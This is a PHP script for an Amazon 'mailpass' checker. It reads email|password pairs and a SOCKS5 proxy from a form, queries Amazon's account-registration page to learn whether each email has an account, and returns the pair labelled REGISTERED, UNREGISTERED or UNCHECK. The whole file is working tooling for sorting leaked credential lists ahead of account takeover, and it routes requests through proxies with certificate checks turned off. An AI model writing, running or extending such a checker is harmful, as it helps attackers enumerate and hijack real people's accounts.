<?php
session_start();
error_reporting(0); 
?>
<?php
// 1: NOTICE, -1: UNCHECK, 2: DIE, 3: BAD/SOCKS DIE, 0: LIVE //
date_default_timezone_set("Asia/Jakarta");
$format = $_POST['mailpass'];
$pisah = explode("|", $format);
$sock = $_POST['sock'];
$hasil = array();

if (!isset($format)) {
header('location: ./');
exit;
}
require 'includes/class_curl.php';
if (isset($format)){
	
	// cek wrong
	if ($pisah[1] == '' || $pisah[1] == null) {
		die('{"error":-1,"msg":"<font color=red><b>UNKNOWN</b></font> | Unable to checking"}');
	}
function _curl($url, $post = null, $usecookie = null, $sock = null, $timeout = null) {
	global $u_a;
    $ch = curl_init();
    if($post != null) {
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt ($ch, CURLOPT_POSTFIELDS, $post);
    }
    if($timeout != null){
        curl_setopt($curl, CURLOPT_CONNECTTIMEOUT, $timeout);
    }
    if($sock != null){
            curl_setopt($ch, CURLOPT_PROXY, $sock);
            curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
    }
    curl_setopt($ch, CURLOPT_URL, $url); 
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    if ($u_a != null) {
    	curl_setopt($ch, CURLOPT_USERAGENT, $u_a); 
    }
    if ($usecookie != null) { 
        curl_setopt($ch, CURLOPT_COOKIEJAR, $usecookie); 
        curl_setopt($ch, CURLOPT_COOKIEFILE, $usecookie);    
    }
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
    $result=curl_exec($ch); 
    curl_close ($ch); 
    return $result; 
}
$curl = _curl('https://www.amazon.com/ap/register?_encoding=UTF8&openid.assoc_handle=usflex&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.mode=checkid_setup&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&openid.ns.pape=http%3A%2F%2Fspecs.openid.net%2Fextensions%2Fpape%2F1.0&openid.pape.max_auth_age=0&openid.return_to=https%3A%2F%2Fwww.amazon.com%2Fgp%2Fyourstore%2Fhome%3Fie%3DUTF8%26ref_%3Dgno_newcust?&email='.$pisah[0]);
                if (inStr($curl,"You indicated you are a new customer")) {
                        die('{"error":0,"msg":"<font color=green><b>REGISTERED</b></font> | '.$pisah[0].' | '.$pisah[1].'"}');
		} else if (inStr($curl,"Create account")) {
			die('{"error":2,"msg":"<font color=red><b>UNREGISTERED</b></font> | '.$pisah[0].' | '.$pisah[1].'"}');
		} else {
			die('{"error":-1,"msg":"<font color=red><b>UNCHECK</b></font> | '.$pisah[0].' | '.$pisah[1].'"}');
		}
	
}
?>